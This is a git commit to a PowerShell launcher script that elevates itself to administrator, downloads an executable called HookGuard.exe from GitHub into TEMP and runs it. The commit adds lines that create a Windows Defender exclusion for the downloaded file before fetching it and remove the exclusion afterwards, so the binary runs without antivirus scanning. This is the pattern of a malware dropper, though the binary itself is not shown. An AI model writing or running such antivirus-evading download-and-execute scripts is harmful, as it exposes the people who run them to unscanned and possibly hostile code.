2d971b9761aea27464fe8d7847bc9f2c8b7b3d45
burugr <jdepp12ah@gmail.com>
2026-05-17 01:15:35 +0100

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,29 +1,20 @@
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-
     exit
-
 }
 
-
-
 $Url  = "https://raw.githubusercontent.com/burugr/HookGuard/main/HookGuard.exe"
-
 $Dest = "$env:TEMP\HookGuard.exe"
 
-
+Write-Host "Adding Windows Defender exclusion for HookGuard..." -ForegroundColor Yellow
+Add-MpPreference -ExclusionPath $Dest
 
 Write-Host "Downloading and starting HookGuard..." -ForegroundColor Cyan
-
 Invoke-WebRequest -Uri $Url -OutFile $Dest
-
 Start-Process -FilePath $Dest -Wait
 
-
-
 Remove-Item $Dest
+Remove-MpPreference -ExclusionPath $Dest
 
 Write-Host "Done." -ForegroundColor Green
-
 Pause
